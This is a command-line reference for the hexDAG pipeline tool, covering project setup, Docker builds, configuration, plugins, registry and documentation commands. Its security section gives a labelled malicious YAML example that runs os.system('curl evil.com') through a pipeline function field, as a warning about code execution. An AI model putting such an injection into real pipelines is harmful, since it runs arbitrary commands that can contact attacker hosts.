# hexDAG CLI Reference

Complete reference for all `hexdag` command-line interface commands.

## Quick Command Overview

| Command | Purpose | When to Use |
|---------|---------|-------------|
| [`init`](#init---initialize-a-new-project) | Create new project | Starting from scratch |
| [`build`](#build---build-docker-containers) | Generate Docker containers | Deploying pipelines |
| [`config`](#config---configuration-management) | Manage configuration | View/edit config files |
| [`plugins`](#plugins---manage-plugins) | Install/manage plugins | Adding adapters or tools |
| [`plugin`](#plugin---plugin-development) | Develop plugins | Creating custom adapters |
| [`registry`](#registry---inspect-components) | Inspect components | Debugging, exploration |
| [`docs`](#docs---documentation-tools) | Build documentation | Creating project docs |

## Table of Contents

- [Global Options](#global-options)
- [init](#init---initialize-a-new-project)
- [build](#build---build-docker-containers)
- [config](#config---configuration-management)
- [plugins](#plugins---manage-plugins)
- [plugin](#plugin---plugin-development)
- [registry](#registry---inspect-components)
- [docs](#docs---documentation-tools)
- [Environment Variables](#environment-variables)
- [Configuration Files](#configuration-files)
- [Common Workflows](#common-workflows)

---

## Global Options

```bash
hexdag [OPTIONS] COMMAND [ARGS]
```

### Options

| Option | Short | Description |
|--------|-------|-------------|
| `--version` | `-v` | Show version and exit |
| `--install-completion` | | Install shell completion |
| `--show-completion` | | Show completion script |
| `--help` | | Show help message |

### Examples

```bash
# Show version
hexdag --version

# Install shell completion
hexdag --install-completion

# Get help
hexdag --help
```

---

## `init` - Initialize a New Project

Create a complete hexDAG project with configuration files, directory structure, and example files.

**When to use:** Starting a brand new project from scratch.

**Difference from `config generate`:**
- `init` creates full project structure (directories, example files, README)
- `config generate` only creates the `hexdag.toml` configuration file

### Usage

```bash
hexdag init [PATH] [OPTIONS]
```

### Arguments

- **`PATH`** - Directory to initialize (defaults to current directory)

### Options

| Option | Short | Description |
|--------|-------|-------------|
| `--with` | | Comma-separated list of adapters (e.g., `openai,anthropic,local`) |
| `--force` | `-f` | Overwrite existing configuration |
| `--help` | | Show help message |

### Examples

```bash
# Initialize in current directory
hexdag init

# Initialize new project with OpenAI and Anthropic
hexdag init my-project --with openai,anthropic

# Initialize with all adapters
hexdag init my-project --with openai,anthropic,local,database

# Force overwrite existing project
hexdag init --force
```

### What Gets Created

```
my-project/
├── hexdag.toml              # Main configuration
├── pipelines/               # YAML pipeline definitions
│   └── example.yaml
├── src/                     # Custom Python modules
│   └── __init__.py
├── tests/                   # Test files
│   └── __init__.py
└── README.md               # Project documentation
```

---

## `build` - Build Docker Containers

Generate Docker containers for pipeline deployments, including Dockerfile, entrypoint script, docker-compose configuration, and documentation.

⚠️ **Security Warning**: For development use only. See [Build Command Guide](#build---build-docker-containers) for full security details.

### Usage

```bash
hexdag build PIPELINE... [OPTIONS]
```

### Arguments

- **`PIPELINE`** - One or more YAML pipeline files

### Options

| Option | Short | Default | Description |
|--------|-------|---------|-------------|
| `--output` | `-o` | `./build` | Output directory for Docker files |
| `--image` | `-i` | `hexdag-<name>` | Docker image name |
| `--python-version` | `-p` | `3.12` | Python version for base image |
| `--base-image` | `-b` | `python:{version}-slim` | Custom base image |
| `--compose/--no-compose` | `-c/-C` | `true` | Generate docker-compose.yml |
| `--local` | `-l` | `false` | Install hexdag from local source |
| `--extras` | `-e` | `yaml,openai,anthropic,cli` | Extras to install |

### Examples

```bash
# Build single pipeline
hexdag build my-pipeline.yaml

# Build with custom output directory
hexdag build pipeline.yaml --output ./docker

# Build multiple pipelines
hexdag build pipeline1.yaml pipeline2.yaml

# Build with custom image name and version
hexdag build pipeline.yaml --image myorg/pipeline:v1.0.0

# Install from local source (for development)
hexdag build pipeline.yaml --local

# Specify extras to install
hexdag build pipeline.yaml --extras yaml,openai,anthropic,database
```

### Generated Files

The command creates a complete Docker build context:

```
build/
├── Dockerfile                 # Container definition
├── docker-entrypoint.sh      # Runtime entrypoint
├── docker-compose.yml        # Multi-pipeline orchestration
├── README.md                 # Usage instructions
├── requirements.txt          # Custom dependencies (empty by default)
├── .env.example             # Environment variable template
├── pipelines/               # Pipeline YAML files
└── src/                     # Custom Python modules
```

### Quick Start Workflow

```bash
# 1. Generate build files
hexdag build my-pipeline.yaml --output ./build

# 2. Build Docker image
cd build
docker build -t my-pipeline .

# 3. Run the pipeline
docker run my-pipeline my-pipeline '{"input": "data"}'
```

### Advanced Usage

#### Custom Dependencies

Add Python packages to `requirements.txt` before building:

```bash
hexdag build my-pipeline.yaml --output ./build
cd build
echo "pandas>=2.0.0" >> requirements.txt
docker build -t my-pipeline .
```

#### Custom Python Code

Add modules to `src/` directory and reference in YAML:

```python
# build/src/my_transforms.py
def custom_transform(data: dict) -> dict:
    return {k: v.upper() for k, v in data.items()}
```

```yaml
# pipeline.yaml
nodes:
  - type: function
    params:
      fn: my_transforms.custom_transform
```

#### Docker Compose

For multiple pipelines:

```bash
cd build
docker-compose up -d              # Start all
docker-compose run pipeline1      # Run specific
docker-compose logs -f pipeline1  # View logs
```

### Security

⚠️ **This command is for DEVELOPMENT ONLY with trusted pipelines.**

#### Disable in Production

```bash
# Prevent execution of untrusted pipelines
export HEXDAG_DISABLE_BUILD=1
```

#### Why It's Risky

YAML pipelines can execute arbitrary Python code:

```yaml
# Malicious example - DO NOT USE
nodes:
  - type: function
    params:
      fn: "__import__('os').system('curl evil.com')"
```

#### Threat Model

| Scenario | Risk | Recommendation |
|----------|------|----------------|
| Local development | ✅ Safe | Use normally |
| CI/CD (trusted YAML) | ✅ Safe | Use normally |
| Internal tools | ✅ Safe | Basic precautions |
| User-uploaded YAML | ⚠️ High | Additional sandboxing required |
| Multi-tenant SaaS | 🔴 Critical | Do not use |

#### Production Hardening

If you must use in production:

1. **Disable by default**: `export HEXDAG_DISABLE_BUILD=1`
2. **Review YAML**: Manually inspect all pipelines
3. **Build in CI/CD**: Use trusted, version-controlled files
4. **Container security**:
   ```bash
   docker run --security-opt=no-new-privileges \
     --cap-drop=ALL \
     --read-only \
     --mem-limit=512m \
     --cpus=0.5 \
     my-pipeline
   ```
5. **Network isolation**: Use `network_mode: "none"` in docker-compose
6. **Secrets management**: Use Docker secrets, not env vars

### Troubleshooting

#### Invalid Pipeline Name

**Error**: `Invalid pipeline filename`

**Solution**: Use only `a-z`, `A-Z`, `0-9`, `-`, `_`:
```bash
mv "my pipeline.yaml" my-pipeline.yaml
```

#### Build Command Disabled

**Error**: `Docker build command is disabled`

**Solution** (development only):
```bash
unset HEXDAG_DISABLE_BUILD
```

#### Module Not Found

**Error**: `ModuleNotFoundError`

**Solution**: Add to `requirements.txt` before building:
```bash
echo "my-module>=1.0.0" >> build/requirements.txt
docker build -t my-pipeline build/
```

---

## `config` - Configuration Management

Manage hexDAG configuration files and settings.

**When to use:**
- Inspect or modify existing configuration (`show`, `validate`)
- Generate configuration file for existing project (`generate`)

**Difference from `init`:**
- `config` commands work with configuration files only
- `init` creates complete project structure including config

### Subcommands

#### `config show`

Display current configuration.

```bash
hexdag config show [OPTIONS]
```

**Options:**
- `--format` - Output format: `toml`, `json`, `yaml` (default: `toml`)

**Examples:**
```bash
# Show current config
hexdag config show

# Show as JSON
hexdag config show --format json
```

#### `config validate`

Validate a configuration file.

```bash
hexdag config validate [FILE] [OPTIONS]
```

**Arguments:**
- `FILE` - Configuration file to validate (default: `hexdag.toml`)

**Examples:**
```bash
# Validate default config
hexdag config validate

# Validate specific file
hexdag config validate my-config.toml
```

#### `config generate`

Generate a configuration template with plugin schemas.

```bash
hexdag config generate [OPTIONS]
```

**Options:**
- `--output` / `-o` - Output file (default: `hexdag.toml`)
- `--with` - Include specific adapters
- `--all` - Include all available adapters

**Examples:**
```bash
# Generate basic config
hexdag config generate

# Generate with OpenAI and Anthropic
hexdag config generate --with openai,anthropic

# Generate with all adapters
hexdag config generate --all
```

#### `config list-plugins`

List all configurable plugins/adapters.

```bash
hexdag config list-plugins [OPTIONS]
```

**Options:**
- `--type` - Filter by type: `adapter`, `tool`, `node`
- `--format` - Output format: `table`, `json`, `yaml`

**Examples:**
```bash
# List all plugins
hexdag config list-plugins

# List only adapters
hexdag config list-plugins --type adapter

# Output as JSON
hexdag config list-plugins --format json
```

---

## `plugins` - Manage Plugins

Manage and inspect hexDAG plugins and adapters.

### Subcommands

#### `plugins list`

List all available plugins.

```bash
hexdag plugins list [OPTIONS]
```

**Options:**
- `--type` - Filter by type: `adapter`, `tool`, `node`
- `--installed` - Show only installed plugins
- `--format` - Output format: `table`, `json`

**Examples:**
```bash
# List all plugins
hexdag plugins list

# List only adapters
hexdag plugins list --type adapter

# List installed plugins only
hexdag plugins list --installed

# Output as JSON
hexdag plugins list --format json
```

#### `plugins check`

Check plugin dependencies and show installation commands.

```bash
hexdag plugins check [PLUGIN] [OPTIONS]
```

**Arguments:**
- `PLUGIN` - Plugin name to check (optional, checks all if omitted)

**Examples:**
```bash
# Check all plugins
hexdag plugins check

# Check specific plugin
hexdag plugins check openai

# Check and show pip commands
hexdag plugins check openai --show-install
```

#### `plugins install`

Install a plugin (wrapper around package manager).

```bash
hexdag plugins install PLUGIN [OPTIONS]
```

**Arguments:**
- `PLUGIN` - Plugin name to install

**Options:**
- `--dev` - Install in development mode
- `--upgrade` - Upgrade if already installed

**Examples:**
```bash
# Install OpenAI plugin
hexdag plugins install openai

# Install in dev mode
hexdag plugins install openai --dev

# Upgrade existing
hexdag plugins install openai --upgrade
```

---

## `plugin` - Plugin Development

Tools for developing hexDAG plugins.

### Subcommands

#### `plugin new`

Create a new plugin from template.

```bash
hexdag plugin new NAME [OPTIONS]
```

**Arguments:**
- `NAME` - Plugin name

**Options:**
- `--type` - Plugin type: `adapter`, `tool`, `node`
- `--output` / `-o` - Output directory
- `--template` - Template to use

**Examples:**
```bash
# Create new adapter plugin
hexdag plugin new my-adapter --type adapter

# Create tool plugin
hexdag plugin new my-tool --type tool

# Specify output directory
hexdag plugin new my-plugin --output ./plugins/
```

#### `plugin list`

List all available plugins.

```bash
hexdag plugin list [OPTIONS]
```

**Options:**
- `--dev` - Show only development plugins
- `--format` - Output format

**Examples:**
```bash
# List all plugins
hexdag plugin list

# Show dev plugins only
hexdag plugin list --dev
```

#### `plugin test`

Run tests for a plugin.

```bash
hexdag plugin test [PATH] [OPTIONS]
```

**Arguments:**
- `PATH` - Plugin directory (default: current directory)

**Options:**
- `--coverage` - Show coverage report
- `--verbose` / `-v` - Verbose output

**Examples:**
```bash
# Test current plugin
hexdag plugin test

# Test with coverage
hexdag plugin test --coverage

# Test specific plugin
hexdag plugin test ./plugins/my-plugin/
```

#### `plugin lint`

Lint plugin code.

```bash
hexdag plugin lint [PATH] [OPTIONS]
```

**Examples:**
```bash
# Lint current plugin
hexdag plugin lint

# Lint specific plugin
hexdag plugin lint ./plugins/my-plugin/
```

#### `plugin format`

Format plugin code.

```bash
hexdag plugin format [PATH] [OPTIONS]
```

**Options:**
- `--check` - Check only, don't modify

**Examples:**
```bash
# Format current plugin
hexdag plugin format

# Check formatting
hexdag plugin format --check
```

#### `plugin install`

Install a plugin in development mode.

```bash
hexdag plugin install [PATH]
```

**Examples:**
```bash
# Install current plugin
hexdag plugin install

# Install specific plugin
hexdag plugin install ./plugins/my-plugin/
```

#### `plugin check-all`

Run lint and test for all plugins.

```bash
hexdag plugin check-all [OPTIONS]
```

**Options:**
- `--fail-fast` - Stop on first failure

**Examples:**
```bash
# Check all plugins
hexdag plugin check-all

# Stop on first error
hexdag plugin check-all --fail-fast
```

---

## `registry` - Inspect Components

Inspect the component registry and view registered adapters, tools, and nodes.

### Subcommands

#### `registry list`

List all registered components.

```bash
hexdag registry list [OPTIONS]
```

**Options:**
- `--type` - Filter by type: `adapter`, `tool`, `node`, `all`
- `--port` - Filter by port type: `llm`, `database`, `memory`, `tool_router`
- `--format` - Output format: `table`, `json`, `tree`
- `--verbose` / `-v` - Show detailed information

**Examples:**
```bash
# List all components
hexdag registry list

# List only adapters
hexdag registry list --type adapter

# List LLM adapters
hexdag registry list --type adapter --port llm

# Show as tree
hexdag registry list --format tree

# Verbose output with metadata
hexdag registry list --verbose
```

#### `registry show`

Show detailed information about a component.

```bash
hexdag registry show COMPONENT [OPTIONS]
```

**Arguments:**
- `COMPONENT` - Component identifier (e.g., `llm:openai`, `tool:web_search`)

**Options:**
- `--format` - Output format: `text`, `json`, `yaml`

**Examples:**
```bash
# Show OpenAI adapter details
hexdag registry show adapter:llm:openai

# Show tool details
hexdag registry show tool:web_search

# Output as JSON
hexdag registry show adapter:llm:openai --format json
```

#### `registry tree`

Display registry structure as a tree.

```bash
hexdag registry tree [OPTIONS]
```

**Options:**
- `--depth` / `-d` - Maximum tree depth
- `--expand` - Expand specific branches

**Examples:**
```bash
# Show full tree
hexdag registry tree

# Limit depth
hexdag registry tree --depth 2

# Expand adapters only
hexdag registry tree --expand adapters
```

---

## `docs` - Documentation Tools

Generate and manage project documentation.

### Subcommands

#### `docs build`

Build documentation site with MkDocs.

```bash
hexdag docs build [OPTIONS]
```

**Options:**
- `--clean` - Clean output directory before building
- `--strict` - Enable strict mode (fail on warnings)
- `--output` / `-o` - Output directory (default: `site/`)

**Examples:**
```bash
# Build docs
hexdag docs build

# Clean build
hexdag docs build --clean

# Strict mode
hexdag docs build --strict
```

#### `docs serve`

Serve documentation with live reload.

```bash
hexdag docs serve [OPTIONS]
```

**Options:**
- `--port` / `-p` - Port to serve on (default: `8000`)
- `--host` - Host to bind to (default: `localhost`)
- `--open` - Open browser automatically

**Examples:**
```bash
# Serve docs
hexdag docs serve

# Custom port
hexdag docs serve --port 9000

# Open in browser
hexdag docs serve --open
```

#### `docs deploy`

Deploy documentation to GitHub Pages.

```bash
hexdag docs deploy [OPTIONS]
```

**Options:**
- `--branch` - Git branch to deploy to (default: `gh-pages`)
- `--message` / `-m` - Commit message

**Examples:**
```bash
# Deploy to GitHub Pages
hexdag docs deploy

# Custom commit message
hexdag docs deploy --message "Update docs for v1.2.3"
```

#### `docs new`

Create a new documentation page.

```bash
hexdag docs new NAME [OPTIONS]
```

**Arguments:**
- `NAME` - Page name

**Options:**
- `--section` - Documentation section (e.g., `guides`, `api`)
- `--template` - Template to use

**Examples:**
```bash
# Create new guide
hexdag docs new getting-started --section guides

# Create API reference
hexdag docs new database-adapter --section api
```

---

## Environment Variables

### Global Configuration

| Variable | Description | Default |
|----------|-------------|---------|
| `HEXDAG_CONFIG_PATH` | Path to configuration file | Auto-discover |
| `HEXDAG_LOG_LEVEL` | Logging level | `INFO` |
| `HEXDAG_LOG_FORMAT` | Log format: `console`, `json`, `structured`, `rich`, `dual` | `structured` |
| `HEXDAG_LOG_FILE` | Log output file | None |

### Security

| Variable | Description |
|----------|-------------|
| `HEXDAG_DISABLE_BUILD` | Disable `build` command (set to `1`, `true`, or `yes`) |

### Adapters

| Variable | Description |
|----------|-------------|
| `OPENAI_API_KEY` | OpenAI API key |
| `ANTHROPIC_API_KEY` | Anthropic API key |
| `DATABASE_URL` | Database connection URL |

### Example

```bash
# Production configuration
export HEXDAG_LOG_LEVEL=INFO
export HEXDAG_LOG_FORMAT=json
export HEXDAG_DISABLE_BUILD=1
export OPENAI_API_KEY=sk-...

# Development configuration
export HEXDAG_LOG_LEVEL=DEBUG
export HEXDAG_LOG_FORMAT=rich
```

---

## Configuration Files

### hexdag.toml

Main configuration file. Auto-discovered in this order:

1. `hexdag.toml` (current directory)
2. `pyproject.toml` with `[tool.hexdag]` section
3. `.hexdag.toml` (hidden file)
4. Parent directories (searches up the tree)

### Example Configuration

```toml
[tool.hexdag]
# Core modules
modules = [
    "hexdag.core.ports",
    "hexdag.core.application.nodes",
    "hexdag.tools.builtin_tools",
]

# Plugins
plugins = [
    "hexdag.adapters.local",
]

# Development mode
dev_mode = true

# Logging
[tool.hexdag.logging]
level = "INFO"
format = "structured"
use_color = true
include_timestamp = true
```

---

## Shell Completion

Install shell completion for better CLI experience:

```bash
# Install completion
hexdag --install-completion

# For bash
hexdag --show-completion bash >> ~/.bashrc

# For zsh
hexdag --show-completion zsh >> ~/.zshrc

# For fish
hexdag --show-completion fish >> ~/.config/fish/completions/hexdag.fish
```

---

## Common Workflows

### Starting a New Project

```bash
# 1. Initialize project
hexdag init my-project --with openai,anthropic

# 2. Navigate to project
cd my-project

# 3. Validate configuration
hexdag config validate

# 4. Check plugin dependencies
hexdag plugins check

# 5. View registry
hexdag registry list
```

### Building for Production

```bash
# 1. Build Docker container
hexdag build pipeline.yaml --output ./docker

# 2. Review generated files
cd docker
cat README.md

# 3. Build image
docker build -t my-pipeline:v1.0.0 .

# 4. Test locally
docker run my-pipeline:v1.0.0 pipeline '{"input": "test"}'
```

### Developing a Plugin

```bash
# 1. Create plugin
hexdag plugin new my-adapter --type adapter

# 2. Develop plugin
cd my-adapter

# 3. Install in dev mode
hexdag plugin install

# 4. Test
hexdag plugin test --coverage

# 5. Lint and format
hexdag plugin lint
hexdag plugin format
```

### Working with Documentation

```bash
# 1. Create new guide
hexdag docs new my-feature --section guides

# 2. Serve with live reload
hexdag docs serve --open

# 3. Build for deployment
hexdag docs build --clean

# 4. Deploy to GitHub Pages
hexdag docs deploy
```

---

## Troubleshooting

### Command Not Found

```bash
# Ensure hexdag is installed
pip install -e .

# Or use uv
uv sync
uv run hexdag --version
```

### Configuration Not Found

```bash
# Show current config location
hexdag config show

# Generate new config
hexdag config generate

# Specify config file
export HEXDAG_CONFIG_PATH=/path/to/hexdag.toml
```

### Plugin Issues

```bash
# Check dependencies
hexdag plugins check <plugin-name>

# List installed plugins
hexdag plugins list --installed

# Reinstall plugin
hexdag plugins install <plugin-name> --upgrade
```

### Build Command Disabled

```bash
# In development, unset the flag
unset HEXDAG_DISABLE_BUILD

# In production, this is intentional
# See CLI_BUILD_COMMAND.md for details
```

---

## See Also

- [Build Command Guide](#build---build-docker-containers) - Detailed `build` command documentation
- [Configuration Reference](#configuration-files) - TOML configuration guide
- [Plugin Development](PLUGIN_SYSTEM.md) - Creating custom plugins
- [Main Documentation](../README.md) - Project overview

---

**Need help?** Run any command with `--help` flag for detailed usage information.
